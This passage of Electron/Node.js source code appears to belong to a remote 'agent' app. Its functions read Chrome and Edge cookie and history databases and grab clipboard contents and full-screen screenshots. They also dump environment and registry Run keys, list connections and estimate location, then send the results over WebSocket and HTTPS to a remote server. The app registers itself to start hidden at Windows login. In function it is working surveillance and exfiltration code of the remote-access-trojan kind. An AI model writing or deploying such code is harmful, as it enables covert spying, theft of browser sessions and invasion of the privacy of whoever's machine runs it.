                    while ($reader.Read()) { $results += [PSCustomObject]@{ host=$reader.GetString(0); name=$reader.GetString(1); path=$reader.GetString(2); secure=$reader.GetBoolean(3); httponly=$reader.GetBoolean(4) } }
                    $conn.Close();
                    $results | ConvertTo-Json -Depth 3`;
                const res = await runPowerShell(ps);
                if (res.success && res.stdout.trim()) {
                    const browser = cookiePath.includes('Chrome') ? 'Chrome' : 'Edge';
                    try { cookies[browser] = JSON.parse(res.stdout); } catch(e) {}
                }
                try { fs.unlinkSync(tempPath); } catch(e) {}
            } catch(e) {}
        }
    }
    return JSON.stringify({ cookies, timestamp: Date.now() });
}

async function clipboardGrab() {
    const ps = `
        Add-Type -AssemblyName System.Windows.Forms;
        $text = [System.Windows.Forms.Clipboard]::GetText();
        $files = [System.Windows.Forms.Clipboard]::GetFileDropList();
        $image = [System.Windows.Forms.Clipboard]::GetImage();
        $result = @{ Text=($text -join ''); FileCount=$files.Count; HasImage=($null -ne $image) };
        $result | ConvertTo-Json`;
    const res = await runPowerShell(ps, 5000);
    if (res.success && res.stdout.trim()) {
        try { return res.stdout; } catch(e) {}
    }
    return JSON.stringify({ error: 'Clipboard unavailable', stdout: res.stdout });
}

async function envDump() {
    const env = { ...process.env };
    const sensitive = ['PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'AUTH', 'PRIVATE', 'CREDENTIAL'];
    for (const k of Object.keys(env)) {
        if (sensitive.some(s => k.toUpperCase().includes(s))) env[k] = '[REDACTED]';
    }
    env._SYSTEM = { platform: os.platform(), arch: os.arch(), cpus: os.cpus().length, memory: Math.round(os.totalmem()/1073741824) + 'GB', hostname: os.hostname(), user: os.userInfo().username, home: os.homedir() };
    return JSON.stringify({ environment: env, timestamp: Date.now() });
}

async function historyDump() {
    const history = {};
    const paths = [
        { browser: 'Chrome', path: path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History') },
        { browser: 'Edge', path: path.join(os.homedir(), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'History') }
    ];
    for (const { browser, path: hp } of paths) {
        if (fs.existsSync(hp)) {
            try {
                const tempPath = path.join(os.tmpdir(), 'find_hist_' + browser + '_' + Date.now() + '.db');
                fs.copyFileSync(hp, tempPath);
                const ps = `
                    Add-Type -AssemblyName System.Data.SQLite;
                    $conn = New-Object System.Data.SQLite.SQLiteConnection;
                    $conn.ConnectionString = "Data Source=${tempPath.replace(/\\/g,'\\\\')};Read Only=True";
                    $conn.Open();
                    $cmd = $conn.CreateCommand();
                    $cmd.CommandText = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
                    $reader = $cmd.ExecuteReader();
                    $results = @();
                    while ($reader.Read()) { $results += [PSCustomObject]@{ url=$reader.GetString(0); title=$reader.GetString(1); visits=$reader.GetInt32(2); lastVisit=$reader.GetInt64(3) } }
                    $conn.Close();
                    $results | ConvertTo-Json -Depth 3`;
                const res = await runPowerShell(ps);
                if (res.success && res.stdout.trim()) { try { history[browser] = JSON.parse(res.stdout); } catch(e) {} }
                try { fs.unlinkSync(tempPath); } catch(e) {}
            } catch(e) {}
        }
    }
    return JSON.stringify({ history, timestamp: Date.now() });
}

async function installedApps() {
    const ps = `
        $apps = Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*,HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName -and $_.DisplayVersion } | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate, InstallLocation;
        $apps | Sort-Object DisplayName -Unique | ConvertTo-Json -Depth 3`;
    const res = await runPowerShell(ps, 15000);
    let apps = [];
    if (res.success && res.stdout.trim()) { try { apps = JSON.parse(res.stdout); } catch(e) { apps = (Array.isArray(apps) ? apps : []); } }
    if (apps && !Array.isArray(apps)) apps = [apps];
    return JSON.stringify({ apps: apps || [], count: (apps || []).length, timestamp: Date.now() });
}

async function geoTriangulate() {
    const wifiRaw = await shell('netsh wlan show networks mode=bssid');
    const wifiNetworks = [];
    const apMatches = wifiRaw.matchAll(/SSID \d+\s*:\s*([^\r\n]+)[\s\S]*?Signal\s*:\s*(\d+)%/gi);
    for (const m of apMatches) { if (m[1] && parseInt(m[2]) > 0) wifiNetworks.push({ ssid: m[1].trim(), signal: parseInt(m[2]) }); }
    const ipPosition = await scrapePublicIP();
    return JSON.stringify({
        wifiNetworks,
        wifiCount: wifiNetworks.length,
        ipPosition: ipPosition.bestResult || null,
        bestEstimate: ipPosition.bestResult || null,
        apCount: 0,
        source: 'ip-assist',
        timestamp: Date.now()
    });
}

async function openPortsDeep() {
    const ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1723, 3306, 3389, 5900, 8080, 8443, 27017, 6379, 5432, 1521, 5000, 8000, 8888, 9000, 9200, 9300];
    const netstat = await shell('netstat -ano');
    const openPorts = [];
    for (const port of ports) {
        if (netstat.includes(':' + port + ' ') || netstat.includes(':' + port + '\t')) {
            openPorts.push({ port, service: getServiceName(port), state: 'LISTENING', local: true });
        }
    }
    return JSON.stringify({ openPorts, scanTime: Date.now(), totalScanned: ports.length });
}

async function registryDump() {
    const keys = [
        'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
        'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
        'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
        'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'
    ];
    const results = {};
    for (const key of keys) {
        const ps = `$key='${key}'; if (Test-Path $key) { Get-ItemProperty $key | Select-Object * -ExcludeProperty PS* | ConvertTo-Json -Depth 2 } else { @{} | ConvertTo-Json }`;
        const res = await runPowerShell(ps, 5000);
        if (res.success) { try { results[key] = JSON.parse(res.stdout); } catch(e) { results[key] = res.stdout; } }
    }
    return JSON.stringify({ registry: results, timestamp: Date.now() });
}

async function activeConnections() {
    const results = {};
    results.netstat = await shell('netstat -ano');
    const tcp = await runPowerShell('Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess | ConvertTo-Json -Depth 3');
    if (tcp.success && tcp.stdout.trim()) { try { results.tcpConnections = JSON.parse(tcp.stdout); } catch(e) {} }
    const udp = await runPowerShell('Get-NetUDPEndpoint -ErrorAction SilentlyContinue | Select-Object LocalAddress, LocalPort, OwningProcess | ConvertTo-Json -Depth 3');
    if (udp.success && udp.stdout.trim()) { try { results.udpEndpoints = JSON.parse(udp.stdout); } catch(e) {} }
    return JSON.stringify({ ...results, timestamp: Date.now() });
}

async function systemScreenshot() {
    const pngPath = path.join(os.tmpdir(), 'find-screenshot.png');
    const ps = `
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing;
        $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);
        $g = [System.Drawing.Graphics]::FromImage($b);
        $g.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, $b.Size);
        $b.Save('${pngPath.replace(/\\/g,'\\\\')}');
        $g.Dispose(); $b.Dispose()`;
    const res = await runPowerShell(ps, 10000);
    let base64 = '';
    if (res.success && fs.existsSync(pngPath)) {
        try { base64 = fs.readFileSync(pngPath).toString('base64'); } catch(e) {}
        try { fs.unlinkSync(pngPath); } catch(e) {}
    }
    return JSON.stringify({ image: base64, size: base64.length, timestamp: Date.now() });
}

function sendResult(id, type, result) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: 'commandResult', commandId: id, commandType: type, deviceId: pairCode, result }));
        if (type === 'locate' || type === 'location') {
            try {
                const loc = typeof result === 'string' ? JSON.parse(result) : result;
                if (loc && loc.lat && loc.lng) {
                    // Send location via HTTP to store in DB + broadcast to browsers
                    const body = JSON.stringify({ deviceId: pairCode, location: loc });
                    const url = new URL(SERVER + '/api/heartbeat');
                    const req = https.request({
                        hostname: url.hostname, port: 443, path: url.pathname,
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
                    }, () => {});
                    req.on('error', () => {});
                    req.write(body);
                    req.end();
                    // Also send via WS
                    ws.send(JSON.stringify({ type: 'location', deviceId: pairCode, location: loc }));
                }
            } catch(e) {}
        }
    }
}

// IPC handlers
ipcMain.handle('minimize', () => mainWindow.minimize());
ipcMain.handle('maximize', () => mainWindow.isMaximized() ? mainWindow.unmaximize() : mainWindow.maximize());
ipcMain.handle('close', () => isAgentMode ? mainWindow.hide() : mainWindow.close());
ipcMain.handle('get-config', () => ({ pairCode, deviceId, isAgentMode, server: SERVER }));

ipcMain.handle('generate', async () => {
    const r = await apiPost('/api/generate', { platform: 'Windows ' + os.release(), hostname: os.hostname() });
    if (r && r.success) { pairCode = r.pairCode; deviceId = r.deviceId; isAgentMode = true; saveConfig(); startAgent(); }
    return r;
});

ipcMain.handle('pair', async (e, code) => {
    const r = await apiPost('/api/verify', { pairCode: code });
    if (r && r.success) { deviceId = r.phoneId; pairCode = r.pairCode; saveConfig(); }
    return r;
});

ipcMain.handle('set-agent', (e, mode) => { isAgentMode = mode; saveConfig(); mode ? startAgent() : stopAgent(); });
ipcMain.handle('trigger-update', () => { checkForUpdate(); });
ipcMain.handle('sys-info', () => ({
    hostname: os.hostname(), platform: os.platform(), release: os.release(),
    arch: os.arch(), cpus: os.cpus().length,
    ram: (os.totalmem() / 1073741824).toFixed(1) + ' GB',
    free: (os.freemem() / 1073741824).toFixed(1) + ' GB'
}));

// ─── AUTO-START PERSISTENCE ─────────────────────────────────────────────────
// Registers the app to launch silently in the background at Windows login,
// keeping the agent alive and reachable even after a reboot. This only runs
// when the app is used as an always-on agent.
function configureAutoStart() {
  try {
    if (process.platform !== 'win32') return;
    const enable = Boolean(isAgentMode || pairCode);
    app.setLoginItemSettings({
      openAtLogin: enable,
      openAsHidden: enable,
      path: process.execPath,
      args: ['--hidden']
    });
  } catch (e) {}
}

// Suppress the window if launched hidden (auto-start)
if (process.argv.includes('--hidden')) {
  app.commandLine.appendSwitch('hidden');
}

app.whenReady().then(() => {
  loadConfig();
  configureAutoStart();
  createWindow();
  createTray();
  if (process.argv.includes('--hidden')) mainWindow.hide();
  if (pairCode) startAgent();
  setTimeout(checkForUpdate, 3000);
});
app.on('window-all-closed', () => { if (process.platform !== 'darwin') app.quit(); });
